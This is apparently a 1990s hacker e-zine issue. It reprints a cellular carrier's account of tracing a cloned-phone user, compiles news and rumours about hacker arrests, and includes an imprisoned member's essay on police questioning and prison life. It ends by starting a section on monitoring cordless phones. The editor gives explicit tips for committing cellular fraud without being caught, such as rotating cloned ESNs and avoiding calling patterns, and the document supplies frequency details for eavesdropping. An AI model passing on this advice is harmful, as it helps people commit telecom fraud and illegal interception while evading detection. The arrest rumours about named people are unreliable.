Ahem...

This issue is dedicated to all of our good friends who have recently been
busted.  In fact, the last three issues are dedicated to them, since there
have been more people busted in the last twelve months then at any time since
Sundevil.  In issue four I espoused my opinion that there was a federal
conspiracy at work with paid informants masquerading as our friends.  Last
issue I gave detailed information on one of our own busted members, John
Falcon.  In this issue there will be information you can use to help keep
yourself out of jail.

In this issue, Disorder has compiled detailed information on the busts of
lasts twelve months.  Each bust that we heard of is detailed with names and
events.  Hindsight is always clearer than foresight, so hopefully you can
learn from these busts how to avoid a similar fate.  Also in this issue, I
am releasing confidential information on how cellular fraud is prevented.
The information is straight from a national cellular carrier and details
exactly how the telcos detect, trace, and bust cellular abuse.  This
information should convince you to take the utmost precautions if you are
experimenting with cellular technology.  Lastly, John Falcon sent me an
article on what to do if you do get busted.  I think this is the first H/P
article ever written from jail!

The following information was an actual article from Cellular One that was
distributed to some of their employees.  This article was not edited in
anyway, and contains the best information I have ever seen on how cellular
fraud is prevented.  If you are participating in cellular phreaking, I
recommend that you read this article very closely and take it as a warning
from the Cellular Telephone industry.  They are getting serious about halting
cellular fraud, and for good reason.  In New York for instance, often
there are more fraudulent cellular calls than legitimate ones on any given
day!  The Fedz are on their side too.  As you may already know, the Fedz ran
an underground BBS for 8 months this year just to catch Cellular Fraudsters.
In fact, Kevin Mitnick was recently busted using the same methods described
in the following article.

The article, dated February 1995, follows:

A team of five Cellular One employees helped stop cellular fraud in Denver
last week.  To protect both our employees and future investigations,
Cellular One team members names will not be released.

California officials tracked a suspect from the Los Angeles area using a
cloned cellular phone to Denver early last week and asked Cellular One for
assistance in locating this suspect.  With the cloned cellular phone number
and a number the suspect repeatedly called in California, the five Cellular
One employees and both local and California law enforcement agents began
tracking the whereabouts of the suspect through the pattern of his cellular
phone calls.

Using AMA searches, RFCALL Trace, directional antennas, an IFR 1500, an
RSAT Plus, and hours of labor, the Cellular One team identified the suspect's
calling patterns.  An AMA search is a record of an individual cellular
phone number's calls.  The cellular number is input along with the
parameters for the search - start and finish date and time - and a log is
printed which shows each individual call made by that cellular number.
This tool is used generally within three days of the calls which you wish
to observe.  AMA searches were compiled over several days to document the
calling patterns of the suspect.

While the AMA searches show the past calling pattern, when attempting to
capture a cellular fraud suspect, real time tools must also be used.  The
Cellular One team used RFCALL Trace which tracks similar information as an
AMA record with the exception that the information can be collected with
only a 10 second delay from real time.  RFCALL Trace also tracks the
individual radio in use, any handoffs, and the signal strength of
the cellular call.  Law enforcement agents issued a subpoena to Cellular One
for all information regarding the fraudulent cellular phone number's
activity on our system.

Most of the fraudulent phone calls were being placed between 10am and
midnight.  Tracking which cell sites, cell faces, and radios the suspect's
calls set up on identified a small geographical area as the suspect's base of
action.  Once an area had been established, one team member drove this area
using an RSAT Plus, an IFR 1500, and a directional antenna (all basic
cellular test equipment used in system optimization) to pinpoint the suspect's
location to a specific apartment complex.  This team me tracked the calls
made by the suspects's cellular number and, watching the faces serving the
calls and he handoffs made by the system during the suspect's calls, he was
able to narrow down the location from which the calls were made to a specific
side of one apartment building.

The law enforcement agents, equipped with their own brand of cellular fraud-
busting tools, asked if the Cellular One team could identify the actual
apartment within the building where the calls were being placed.  A narrowband
directional antenna was set to the transmit frequency of the cloned phone.
One problem was that with each new phone call, the frequency being tracked
changed.  The suspect made short calls, most around one minute, with the
longest between three to five minutes.  Using the directional antenna
and resetting the frequency with each new call on the cloned phone, the
Cellular One employee identified a group of apartments within the building
from which the cellular calls were being placed.

Unfortunately, the suspect slipped out of the building before the specific
apartment was identified.  Again using RFCALL Trace, the Cellular One team
logged the suspect's next phone call on a cell site near Stapleton
Airport.  Law enforcement was notified and kept aware of the phone calls as
the suspect traveled throughout the system.  It became evident that the
suspect was moving back toward the apartment complex.  Surveillance
officers outside the apartment noticed three men enter just moments before
the Cellular One team notified them that a call had been placed from the
apartment.  Within 20 minutes, the suspects again left the apartment.
Denver Police began pursuit of the suspect and made the arrest.  Five
additional cellular phones were found in the suspect's apartment.  It has
not been determined if these phones are cloned.

Although cellular fraud exists, it is possible to catch the criminals.
Congratulations to our fraud busters!  Cellular One asks that you keep this
story confidential since the specifics of this and future investigations
depend on our ability to catch the criminals in action.

End of Cellular One Article.

Pretty scary, huh?  Cellular phreaking used to be considered pretty safe, but
times have changed.  The cellular phone companies are losing so much money on
cellular fraud, that they have made busting the cellular hackers a priority.
If you do commit cellular fraud, I suggest you use the following guidelines:

1.  Never use the fraudulent ESN for over two weeks.
2.  Change ESN's as often as possible.
3.  Avoid creating a calling pattern with your fraudulent ESN.
4.  Avoid using the fraudulent ESN from a stationary location.

These tips could keep you out of jail!  Because you cannot divert with a
cellular phone (unless you are Kevin Mitnick) these precautions are necessary.
As my friend John Falcon told me, "Its not worth doing time for silly phone
shit."  He's right.  H/P is fun, but anyone who has gotten busted will tell
you the same.

But if despite these warnings, you still decide to cellular phreak, just make
this quote from Gatsby your mantra, "An ESN a day, keeps the federals away."

        With all the busts happening in the past year, and a lack of
information in the scene regarding who got busted when, and for what,
I decided to put this article together. After working on this for a
while, I realized that not only was it a little difficult in finding
bust info, but half of the little you found was bullshit.

        The information in the following article is as accurate as I
can find. With all the different accounts of what happened, different
nicknames, different NPA's, and pure stupidity out there, don't bet your
life on the information contained within this article.

        The following sections give you some details about some busts,
and RUMORS of others. I indicate which are rumors and which are legit.
I utilized everything from BBS posts, to newspaper articles, to word
of mouth. Thanks to those who helped me on this. And by no means is this
NEAR complete...

     into the Portland, Oregon AT&T Wireless computers.
  Kevin Watkins - "Led" - Houston, Texas:  Accused of conspiring to break
     into the Portland, Oregon AT&T Wireless computers.
     Watkins used the computer system of Embry Riddle University in

      unauthorized access devices.
  Michael Clarkson - "Barcode" - Brooklyn, New York: Accused of possessing
      and trafficking in hardware used to obtain unauthorized access to
      telecommunications services.

Penalty:
        If convicted, defendants face maximum possible sentences ranging
from 15 years for Cushing to 10 years for Bradford, Clarkson and
Natoli and five years for Lacap and Watkins.

Details:
        Starting in January, Stacey Bauerschmidt and other Secret Service
agents in Newark, NJ, set up what is now called "an electronic chop shop"
by the press. Stacey (in cooperation with a 'nameless informer' who will
be mentioned later) set up a computer BBS called "Celco 51" with the
intent of busting hackers and phreakers specializing in cellular phone
fraud.
        For the first sixth months, the board operated using MBBS with
four nodes. At any given time the board had an 800 re-route (not really)
so that the users could call without any problem (ANI). To the credit of
the agents in charge, the board did not allow just anyone access. The sysop
(PMF) appeared to discriminate and only allow the 'elite' members of the
H/P community on. With the illusion of security, the agents running the
board could successfully monitor the users, and begin to make deals with
the hackers.
        Stacey [Who went by 'Carder One'] continually asked members of the
BBS if they were interested in selling ESN/MIN pairs [Used for cellular
phone fraud]. These 'pairs' are considered 'illegal access devices' and
are usually found in large enough amounts to consist of felonies. On top
of the illegal access devices, Stacey was looking for people that were
willing to sell illegal cloning equipment. This equipment consisted of
devices used to get pairs, clone phones, and reprogram phones.
        The operation was very successful in many ways, notably the ability
of the agents to mask the true nature of the board. For over eight months,
Stacey and other agents monitored the board looking for any chance to
prosecute any of the members. The sysop (PMF) continuously advertised the
board to the members, as well as mailed and HARASSED members into calling
more than they wished to (Entrapment anyone?). PMF was responsible for
mailing members up to three times a day, message flooding people on IRC,
and using other methods of harassment to get hackers to call.
        On top of the harassment, Carder One continuously asked for people
to post 'pairs' as well as sell them in private. In a few cases, individuals
would not have considered selling these pairs had the federal agents not
harassed them so much. Ahem.

        "Cushing and five others were arrested in four states during a
sweep last week by federal agents. Another 14 raids spread over eight
states led to the confiscation of 31 computers, 65 illegally programmed
phones and 14 "readers," devices used to illegally pluck cellular phone
numbers and serial codes from cellular phone transmissions."
        [Wonder who's computer will run the next sting board?]

        "But because the alleged crooks posted phone numbers on the bulletin
board indicating where they could be reached, the Secret Service was able to
trace the calls, leading to the arrests."
        [Need we emphasize the importance of Diverting any more?]

        "But officials said this case represented the first time that the
Secret Service had created an entirely new computer bulletin board..."
        [Couldn't bust any warez kiddies recently...]

[Watch out kiddies... They are using more than 'questionable' methods
of busting hackers and phreaks these days. If you haven't met someone,
be careful of what you post on their systems.. many people thought
PMF was cool until he NARKED on everyone that he could.]

"ANARCHIST BUSTED FOR WRITING MAGAZINE"

From: The Anarchives <tao@presence.lglobal.com>

In early march of 1995 I was arrested for "Unauthorized Use Of A Computer".

Three large, white, plain-clothes detectives from 52 division in downtown
toronto came to my house, promptly arrested me, took me to a holding
cell, and conducted a strip search (looking for codes I guess). I was
held in custody for four hours (7:30 pm to 11:30 pm), and released as a
result of substantial protest made by friends and family at the sergeants
desk.

I was being accused of breaking into the computer systems at the
University Of Toronto for the purpose of publishing "Anarchist
newsletters".

The sysadmin of ecf.utoronto.ca, one Professor Jack Gorrie
<gorrie@ecf.utoronto.ca>, saw someone on his system publishing Anarchist
materials, assumed I was a malicious "hacker", turned over all records of
my email, news posts, key strokes, you name it, to the police at 52
division. The police realizing how dangerous these "hacker anarchist"
types are, had to come to my house to cuff me, bring me down, and strip
search me.

I was to face trial for a possible six months in prison, just for
exercising my democratic rights and responsibilities.

Of course the end result was that the charges were dropped, although this
was not until several months later (sept 7, 95), after several
appearances in court, and after my agreeing to pay $400 to the skule.

"FEDS SAY HACKERS CRACKED INTO TOWER CREDIT CARD RECORDS"
by, Denny Walsh

From: The Sacramento Bee
Saturday Sept. 16, 1995

        Two talented Berkeley hackers were charged Friday with computer-
age crimes against a Tower Video rental store in Sacramento, federal
authorities said, in large part because they went up against Tower's even
more talented electronic security corps.

When authorities raided their apartment last month, Terry Patrick Ewing,
21, and Michael Yu Kim, 20, had the credit card numbers of 2,000 Tower
customers, federal prosecutors said.

        According to a federal grand jury indictment, Ewing and Kim used
their personal computer to break into a system know as TRON, owned and
operated by Tower's West Sacramento-based parent, MTS Inc.

        Kim and Ewing are charged in a three-count indictment with
conspiracy, fraud and the unauthorized destruction of computer data.

        The prosecutor said the pair are not in custody and will be
allowed to surrender next week. He said he does not see them as flight
risks.

"KEVIN MITNICK BUST - HIGHLIGHTS"

From Multiple Sources

If you want more details, read the hundreds of articles about this story.
Also, read the Phrack 47 editorial pertaining to this subject.

Kevin Mitnick (31)
-One of the first indicted under Computer Security Act of 1987
-Search began in November 1992
-Mark Seiden (expert in firewalls) discovered that someone had obtained
 all of Netcom's credit card numbers for 20,000 online subscribers.
-Stole files from: Motorola, Apple, Netcom, and more.
-Mitnick used the Well as a repository for files he stole from computer
 security expert Tsutoma Shimomura.
-After raping Tsutoma, he used Bruce Koball's account to transfer
 proprietary software from Motorola, NEC, Nokia, Novatel, Oki, Qualcomm,
 and other cell manufacturers.
-Shimomura concluded that it was Mitnick, and that he was operating
 through cellular, from Raleigh, NC
-Mitnick was bouncing his calls through GTE Switches, local switches,
 and a few types of cellular switches, and utilized Netcom's dialins.
-Lived in Player's Court, a 12-unit apartment building in suburb of
 Duraliegh Hills, three miles from the airport. He lived in Apt 202.
-Until a week or two before he was arrested, FBI surveillance agents in
 Los Angeles were certain that 'the intruder' was somewhere in Colorado.
-FBI arrested him at 24 hour stakeout
-Arrested in Raleigh, N.C. at 1:30 a.m.

"PHREAKS BUSTED IN NY... MORE TO COME"

"Ok all Listen up and listen good. resistance is down. Maybe permanently. Most
of you prolly haven't heard yet, but there have been major busts going around.
... Today alone i found out that Neon Samurai, Tokien Entry, and Hellfire
have been busted. ... that they even busted craig neidorf(knight lightnig)
again.

More bad news. If you are on UPT(unphamiliar territory) or Cellco 51, stop
calling. The SS who raided hellfire slipped a bit and bragged about being on
those boards.

Hellfire said the feds were mostly interested in credit cards,
VMB's, and Cell phones.

They are looking to bust for cellular, VMB's and credit cards...

Tokien entry i found out has been in jail for 2 days!
Neon Samurai was busted for credit cards and also for telco equipment that
the nynex people said was worth 50,000. "


PMFs (Narc) reply:

"dude, this is utter shit and i expect u to post this reply for me seeing
as i ain't on that bbs.. Hellfire gave up his accounts to UPT and my bbs
among others, he was the only person busted and nothing to do with his
busts was EVER mentioned on my board. He doesn't even get involved in
cellphones, he was busted coz he and every other person busted used
1 800 CALL ATT from his house.. what a bunch of lamers... I don't even
know who wrote that next but i would like to find out.. probably the guys
from NYHE..."

"ALPHABITS ORIGINAL BUST LAST YEAR"

Caught alphabits on irc lastnight and he said:

<alphabits> but I got sent to prison 7 months ago, and lost contact ***

According to different people, he was busted for check fraud and/or credit
fraud and/or cellular fraud. Unfortunately, I will not be able to talk
to him until after this article.

"SYNCOMM, MEMBER OF S.O.B (SERVANTS OF BABUSHKA) RAIDED"

From another group member:

Syncomm was talking on the phone.. the day before Master of Reality got
busted... so MOR, Greg and equinox were sitting there chatting away when
a load of federal agents <SS, FBI, 1 NSA guy and even a guy from customs>
and some local police busted down his door. He dropped the phone and all
they heard was a rustle of papers .. then a "Secure that paper!" then a
click.. They put a shotgun to his head and said "Hello Syncomm". They
said he was the leader of S.O.B. an international terrorist organization.
Then again they thought that Crypt Keeper and MOR were also the sole
leader of SOB ... So then they put a knee to his back and handcuffed him
<Greg, 16, apparently posed a serious threat>. They proceeded to
interrogate.. and at one point this one agent <female> tried to seduce him
into talking <I think he would of he she did more .. ;)> ..

He was finaly was lead outside when his neighbor walked up to them and
handed them all of Greg's notes, etc.. that greg had asked him to stash..
Greg then threatened his neighbors life.. <which he came back to do
unhandcuffed afterwards> and was led off to holding... were they produced
"A big fucking printout" that apparently detailed Greg's activities.. they
nailed him for hacking UC and then accused him of crashing their
systems.. Along with criminal tools <his computer> and some other
offenses.. <one of which I am sure of is Wire Fraud.. they love that>

"FBI REVEALS ARREST IN MAJOR CD-ROM PIRACY CASE"

SOFTWARE CRACKDOWN - Two Canadians were arrested in a blitz
that has software companies upset to see piracy extending
into the CD-ROM format.

From the Associated Press, Saturday Dec 24 1994

BUFFALO, New York - The FBI has arrested a Canadian father and son in what
is believed to be the first major case of CD-ROM piracy in the United States.

Agents said Thursday they seized 15,000 counterfeit copies of the popular
CD Rom games  REBEL ASSAULT and MYST that were being sold at 25% of retail
value.

PETER MISKO, 63, of Mississauga, Ontario, and his son, BRUCE MISKO, 36, of
CHICAGO were arrested in Buffalo and charged with felony copyright infringe-
ment.  The counterfeit goods were recovered in a Niagara Country warehouse
authorities said.

The FBI told the Los Angeles Times that additional warrants were served in
INDIANA and NEW HAMPSHIRE as part of a crackdown on retail stores selling
the illegal software.  MORE ARRESTS ARE EXPECTED.

"MULTI-COUNTRY EFFORT CRACKS COMPUTER RING"

TORONTO -  Canadian, US and European investigators
have cracked a ring of computer hackers who allegedly
stole about $5 million US$ by breaking into the
computers of phone companies and other firms.

The 12 hackers who met over the Internet, used coding
and call switching to conceal the transfer of funds,
codes and communications.

RUDY LOMBARDI, 22, of MISSISSAUGA Ontario PLEADED
GUILTY on Tuesday, June 27 1995.  He got 90 days in
Jail and 100 hours of community services for HELPING
the RCMP with their investigation - instead of at least
a one year jail sentence.

From recent posts and word of mouth, the Philadelphia 2600 meetings are
having a hard time making it past 5 minutes. Apparently, local police in
coordination with mall rent-a-cops [joining of forces there], are kicking
hackers and phreakers out of their meeting place based on charges of
loitering and conspiracy [to do what?! Assemble?]. Currently, police
are threatening to break up meetings, and/or jail participants for the

"FEDZ BUST KID IN MINNESOTA"

November '94, a 15 year old in Minnesota had a pleasant visit by
federal agents. According to newspaper articles, the boy [unnamed
in the article] was basing his hacks out of the Detroit Free-Net.
"He used passwords to gain access to more than 10 computer networks
from Detroit to Moscow". During his time on the Detroit Free-Net,
he was said to have maliciously disabled enough of the system 'forcing'
it to shut down.
   Currently, the boy is facing potential charges for using
telecommunications devices to cross state lines, and felony charges
for breaking into computer systems.

   Other favorite quotes from the articles about this case:
   "...hospitalized, possibly for psychological reasons, when police
    confiscated his computer modem and software programs Monday."

   "...said the boy appeared to fit the typical hacker profile: a
    15- to 20-year-old male, many who have low self-esteem. 'He really
    could use a girlfriend instead of a computer' Grewe said."

"THE TROUBLES OF BERNIE S."

Recently, a lot of press has been covering the story of 'Bernie S'.
You can find more info about his bust on alt.2600 as well as several
'hacker' mailing lists. Here are some of the interesting quotes from
one of those articles:

   "Ed Cummings, also known to many in cyberspace as Bernie SS was arrested
on March 13th, 1995 for 2 misdemeanors of possession, manufacture and sale
of a device to commit Telecommunications fraud charges. He is being held in
Delaware County Prison in lieu of $100,000.00 Bail."
   His arrest took place at a local 7-11 where *15* police cars pulled
into the parking lot. During the interaction with the officer, he told
them 'no, you can't search my car', yet minutes later, he noticed
an officer going through the contents of his car. Despite his protests,
the officer removed several timing crystals, tone dialers, and a 'broken
red box'.
   The following day, Bernie was at a friend's house when '8 to 10' plain
clothed armed men burst into the house yelling 'freeze'. Minutes later
he was being taken to jail in cuffs. He was not formally charged until
his arraignment where his bail was set to 100,000 dollars because he
refused to talk with the police without counsel present.
   "The Judge dropped the two unlawful use of a computer charges due to
the fact that the evidence was circumstantial and the county had no actual
evidence that Ed had ever used the computers in question. As of 3/27/1995
Ed Cummings is still in Delaware County Prison awaiting his trial."

"FEDZ CATCHING ON TO CALLING CARD SKAMS"

         A $50 million telephone calling-card theft ring disclosed
earlier this week by federal investigators is representative of the advanced
types of scams that have emerged in the last two years as telephone companies
have become better at ferreting out fraud.

The Secret Service said Ivy James Lay, a switch engineer at MCI's network
center in Charlotte, N.C., stole over 60,000 calling card numbers from MCI
and other long distance companies, later selling them to 'band of computer
hackers.' The estimated value of the cards lies near $50 million. The
Secret Service (which investigates fraud like this) claims this to be the
largest case of calling card theft to date.

"SOME OF THE INTERESTING FACTS FROM A NEWSPAPER ARTICLE"

Two computer hackers have been sentenced to fed. prison and an accomplice in
Mn. awaits sentencing for his part in an international phone conspiracy.
Ivey James Lay of Haw River, N.C., and Frank Ronald Stanton of Cary, N.C.,
were part of a hacker ring that stole credit-card numbers from MCI's
Computer terminal in Greensboro. A third member of the ring, Leroy James
Anderson, of Minneapolis pleaded guilty Friday in Minnesota to federal
copyright violations.

US District Court Judge James Beaty on Fri. sentenced Lay to tree years
and two months in prison. Stanton, a 22-year-old student at Wingate College,
was sentenced to one year. Anderson's sentencing is expected this summer.

The conspiracy stretched into several European countries and cost long-
distance carriers more than $28 millon, authorities said.

Lay and Stanton pleaded guilty in Jan. to charges of fraud and trafficking
in unauthorized access devices. The group bought and sold at least 50,000
numbers from 1992 until the summer of 1994, according to court documents.

"What I did was very stupid," Stanton told Judge Beaty at his sentencing.
"I'd like to go back and finish college."

UTRECHT, THE NETHERLANDS, 1995 MAR 6 (NB) -- A Dutch student has
become the first person to be convicted of computer hacking in the
Netherlands. Ronald Oosteveen, a 22 year old Utrecht computer science
student, was handed down a six month suspended sentence by
magistrates last week, and was fined around $3,200

Oosteveen was accused of breaking into university, corporate and
government computers, following his arrested in March, 1993, just
three weeks after new Dutch anti-hacking legislation came into force.

Oosteveen was caught in the act of trying to hack into the computer

(Front Page Headline) COMPUTER-CRIME RING CRACKED (Monday June 19, 1995)
        Quartet accused of hacking into Arapahoe college's system,
                        inciting illegal acts.

---------------------------------------------------------------------------
(Fourth Page Article) 4 ACCUSED IN COMPUTER HACKING CASE (By Marlys Duran)
Suspects used equipment at college to incite criminal acts, officials say.

Arapahoe County - Hackers calling themselves "The New Order" [Look Ma!]
allegedly gained access to the Arapahoe Community College computer and
used it to distribute tips on how to commit crimes.
        One man operated a computer bulletin board on which contributors
from throughout the world exchanged how-to information on crimes ranging
from credit-card fraud to high-tech burglary, authorities said. [Of course
they fail to make that distinguishing gap that this board was NOT run off
the Arapahoe system, and that it was a private BBS run out of his house]
        Computers were seized from the homes of four hackers, ranging in
age from 15 to 21.  Secret Service experts were called in to help crack
the computer files. ['type filename.txt' is hard to crack eh?]
        Investigators found software for breaking passwords, lists of
private passwords for several computer systems, instructions for cellular
telephone fraud, private credit reports [Plural? Nope], lists of credit-card
numbers and electronic manuals on how to make bombs and illegal drugs.
[Yes, WE did the oklahoma bombing!@$!]
        In a 97-page affidavit detailing the 18-month investigation,
investigator John Davis of the Arapahoe district attorney's office said
that the hackers "operate with an attitude of indifference to the rights
and privacy of others and have made efforts to teach and involve others in
their criminal enterprise." [What the fuck does the government do everyday?]
        At the home of a Denver juvenile, authorities found hazardous
chemicals and a book on how to make bombs.
        Nicholas Papadenis, 21, of Broomfield, and John Patrick Jackson, 19,
of Thornton, were charged last month with committing computer crimes and
conspiracy.  Both are scheduled to appear in Arapahoe County Court on July
5.
        A decision is pending on whether to charge a 15-year-old Highlands
Ranch youth and a 17-year-old Denver resident, chief deputy district
attorney John Jordan said Friday.
        The affidavit says Papadenis, Jackson, and the youths hacked into
the Arapahoe County Community College computer system, then used it to
illegally distribute copyrighted computer games [Sorry, TNo doesn't have
a warez division yet] and electronic magazines promoting fraud, theft,
burglary and money-laundering.
        One of the magazines stated, "This publication contains information
pertaining to illegal acts.  The use of this information is intended solely
for evil purposes." [Source: CoTNo 1!@#!@]
        Court documents do not indicate the hackers had political motives,
and authorities declined to comment on the case. [Hackers with political
motives would be way above their head.]
        A Denver University expert said computer criminals usually are not
motivated by ideology.  They usually are young people who are "doing it for
the sheer challenge of it - just to demonstrate that they're able to do it,"
said Don McCubbery, director for the center on electronic commerce at DU.
        McCubbery estimates that authorities learn of only 5% of computer
crimes.  He said computer security experts generally have difficulty
keeping up with the hackers. [No shit]

            -----------------------------------------------
            (Side note box)  THE NEW ORDER (Bullet listing)

Some accusations listed in court documents concerning The New Order group
of computer hackers:
        - A hacker from the United Kingdom offered suspect John Jackson
          a VISA card number with a $300,000 credit limit. [Tacos anyone?]
        - A computer seized from a Highlands Ranch home contained password
          files for computer systems at the University of Colorado
          at Boulder.
        - A note found in Jackson's home indicated his plans to hack into
          the Thornton Police Department computer. [Yes, they believe
                                                    everything they read]
        - Jackson also had a computer file containing access information
          for Taco Bell and McDonald's computers.  [There goes national
                                                               security!]

                 What Happens When You Get Caught
                 --------------------------------
          [A.K.A  The Hackers Guide to the Law and Prisons]

                                by

            D. Fanning - A.K.A. John Falcon/Renegade - TNO


Well if you are reading this, that means you are either curious or shit
happened and the law reared it's ugly head and they nabbed you.  Now what
you are about to read is absolutely fucking true.  Why is this?  Because I
am spending the next year or so in prison for hacking.  Now needless to
say, I have already announced my retirement from the scene, but I still
wanted to write and rant and rave about all the things that happen in this
world and to clue you in on a quite a few things.

Let's start with the ground rules:

1.  You cannot make a deal with a cop.  So when they start reading Miranda
    rights, keep silent or just ask inconspicuous questions like "Where are we
    going?", or the common ne, "What's going on here?  Why am I being charged?"

    Only a D.A. or someone in the lawyer capacity can make a deal.  If a
    cop offers a deal, you are still going to get charged.  Cops cannot
    make any exceptions on anyone.  So drop all ideas of such.

2.  Do not narc on anyone when the questioning starts.  Your best bet would
    be to just stay silent till the lawyer shows up or something.  Why?
    Questioning wouldn't be done unless there were gaps in their
    investigation.  What you want is as many of those as possible.  The
    more you have, the better it will be when plea bargaining starts up.
    At the very least though, lets say the they do convict you, the feds
    and the court find you guilty or you plea that way and you are thrown
    into the clink.  Guess who does your admissions paperwork? You guessed
    it, the inmates.  Word has a way of coming around to dealing or giving
    a very wide berth to those who do the narc thing  Key idea:  "If you
    fall, don't bring others down too.  It just adds to the load on you."

3.  During questioning, they will put on a lot of plays to make you talk,
    they will offer you something to drink or something to make you feel
    more comfortable.  Well why not?  Spend 60 cents and get your work done
    for you by a confession.  Makes things nice and neat.  Don't fall for
    it.  If you are thirsty, accept the drink and don't tell them shit.

4.  They will also do some kind of powerplay on you.  They try to make you
    think that they are doing you a favor, but in reality, you are digging
    a deeper hole for yourself.

5.  The idea of you being innocent until proven guilty has gone the way of
    the do-do bird.  When a jury sees you, the first thought that comes to
    mind is not if you are guilty or not, the question is HOW guilty you
    are.  The way they see it, if you are not guilty, what are you doing
    in front of them in the first  place?  The O.J. Simpson trial is a
    perfect example.  Also, look how many cop shows are around the box.
    That right there is a disgrace in my book.  First they have you on
    film, second they pat each other on the back while you are in
    misery.  Sick.

Well on with the show.  If they have already done an investigation on you
and you don't hear from them in a while, the first natural reaction would
be to relax and let your guard down.  WRONG ANSWER!  That means that some
shit is really going to go down.  You should be extra careful and not
talk about it to anyone.  Most likely they are looking for more evidence
to make it harder on you in the long run, like a wiretap.  In the federal
system, all you need is one person's permission to record a phone call.
If you have to talk about it, use face to face contact and pat each other
down to make sure there is no bug. For instance, when I was arrested I made
a fatal mistake and  talked about it to one of the co-defendants and he
had cut a deal with the D.A. already.  My bacon was cooked when I heard
my voice on a tape recording.

Well no matter what happens, sooner or later you will get nabbed so I won't
get into the details of this.  All I can suggest is that you really do
what ever you can to get a real attorney.  P.D.'s are good for some
things but they get their paycheck from the same place that nabbed you in
the first place so don't let that fool you too much.  I will admit that
it is better than nothing though.

Most likely for the computer hackers out there, they will charge you
under 18-USC-1029 which is Fraudulent or Counterfeit use of an Access
Device.  This charge was mainly intended for credit cards but the D.A.'s
have taken it to just about everything that involves computers or
communications in general.

Now there are some landmark cases that have beat this into the ground.
One of them being U.S. vs Brady which was a guy making satellite decoders
with the stops pulled out of them.  He beat this due to the ruling that
the signal was out there everywhere and that he merely just decoded the
signal.  Therefore there was no actual loss, just potential loss which
doesn't count.  Another one is U.S. vs McNutt in the 10th Circuit of
Utah.  This guy made chips for cellular phones that would send different
ESN/MIN pairs to the cell site that made it always seem like a new roamer
every time he calls.  The cell site just goes ahead and gives him the call
because it doesn't have time to verify if it is a valid MIN/ESN pair.  He
won the case due to the same fact that there were no accountable loss
because it never used or really billed any legit customer.

The flip side of that is being two weeks ago from when this was written,
a guy was tried in LA for the exact same thing and was found guilty,
appealed the case, won the appeal, then the government re-appealed it and
he lost again.  This caused a split in the court circuits which means
that this will got the Supreme Court.

Remember that the government or any government agency will not press any
issue unless there is some kind of financial deal behind it because they
are wasting time and resources on you when they can be getting Joe Blow
Cartel Drug Dealer.

So they find you guilty or you plea.  The next step is the Pre-Sentence
Investigation.  They basically take a fine tooth comb and find any dirt
about you that they can.  You will be amazed about all the things they
can do to make you seem like a threat to society, the American way of
life, apple pie and all...  All you can do is make sure or try your
hardest to make it clean as possible.  Now I got ripped hard on mine due
to very strained relations with one of my parents and they managed to
throw everything that anyone had ever said about me together to make it
look like I was truly evil.  That is where the cops will come back and
haunt you because everything you say will be in that report.  Every
little action and all will be written with a slant of a cop.  (Needless to
say who writes the report kids...  The U.S. Probation Office, a branch of
the Secret Service and the F.B.I.)

Well you are convicted and here you are.  Depending on where you live,
you will either be bussed/vanned to the prison where they choose for
you or they will fly you there.  After you are sentenced you now belong
to the Bureau of Prisons (A D.O.J. branch).  Basically you will be taken
to a county jail for holding while they classify you and then you get
transported out.  When I was transported out, I was in shackles and all
taking a ride on Fed Air.  The USM's have a fleet of 737's they confiscated
from drug busts and converted them into their own use.  You are basically
bussed out to a unused or empty part of the airport and with a large ring of
USM's with shotguns in their hand, you get put onto an airplane and given a
box lunch and off you go.  I went from Portland to Sacramento to Phoenix
in one day.  Spent the night at the FCI in Phoenix then the next morning
from there to Lompoc where I am now.

Remember these words though... You are now property of the B.O.P.  Basically
you are luggage, they can transport you at any time whenever they want to.
But, depending on where you go, it isn't all that bad.  Most likely you will
meet friends or acquaintances that will help you along.  Just ask a few
questions and usually they will know.  One thing to never do is be secretive
about why you are there.  You are there, most likely someone else is there
for the same thing and you can get a strong fellowship going with people
in the same predicament.

One thing to always keep in mind from now to eternity, no matter where you go.
The feds are nailing everyone for 'Conspiracy'.  It's a damn shame when
you go to a place where 90 percent of the inmate population is here on some
kind of drug related charge and of that 90%, 35% are here on conspiracy
related charges. Truly something to think about.

Now for the hackers and phreakers that are facing jail.  If your PSI report
even breaths any mention of some kind of use with the computer, you will be
banned from that.  3 days ago I was given a list of direct orders to avoid
all contact of that.  Likewise, they put a restriction on the levels of
computer related material that I can read.  Usually you can get any
periodical you want except for things that deal with gay man on man stuff.
Just like the gay people feel, that smells of discrimination but that's
just the way it is.

Phones are something else that you will wish that changes real quick.  The
phones are run by a B.O.P. thing called ITS-Inmate Telephone Services.
Basically it's a Unix run PBX that limits the people you can call and it
throws the bill on you.  No more collect calls or anything of that nature.
Just doesn't happen.  But the inmates have won a Class action suit against
the B.O.P. about this and the government right now is appealing it.
Technically with a suit or even an appeal, you have to implement it
as soon as you can after the judgement is made.  But it's been a year
since they won it and nothing changes.  Basically it's the government stalling.

Well that's all for me to say this time around.  Remember to keep the dream
alive and judge for yourself with that piece of gray matter between your
ears.

SYNOPSIS
--------
The "Cordless Fun" (Noam Chomski, 2600 Magazine Summer 1994) article
doubtlessly sparked an interest in cordless phone monitoring.  Wireless
telephones are a prime target for monitoring.  Both cordless and cellular
telephones are nothing more than radio transceivers that, at some point,
interface with the telephone system.  This article will seek to expand on
and clarify some points made in "Cordless Fun", and also to point to some
other areas of interest.

=============================================================================


CORDLESS
--------
Legal Stuff:
Monitoring cordless phones is now a federal crime!  Recent legislation
prohibits listening in on cordless phones, much the same as cellular phones.
Also, the Communications Act of 1934 makes it a crime to divulge
anything you monitor to another person.  It is also illegal to use anything
that you hear for personal gain.  Note that this applies to anything that you
monitor, not just cordless phones.  Alternatively, there are presently no
restrictions on scanners that are capable of receiving cordless phone
frequencies.  However, I suspect that in the near future the feds will deny
certification to such scanners, as they did with scanners that could receive
cellular frequencies.

Technical Stuff:
Cordless telephones transmit and receive with very low power.  This is
primarily to minimize interference with other nearby cordless telephones.
This makes scanning for cordless telephones a short-range endeavor.  Most
cordless phones of recent manufacture operate in the 46-49MHz range.
However, the FCC has recently opened up a part of the 900MHz spectrum for
cordless telephone usage.  The new 900MHz phones often offer greater range
and increased clarity.  There are also models sporting "spread-spectrum"
technology, which makes monitoring with conventional scanning-receivers a
virtual impossibility.  Another security measure on some cordless phones
involves encoding the DTMF tones sent from the handset to the base.  This
prevents the base from accepting tones from other, unauthorized, handsets.
It does not hinder monitoring the calls, but the DTMF tones will not be
recognizable.  In the 46-49MHz phones, there are ten frequency pairs
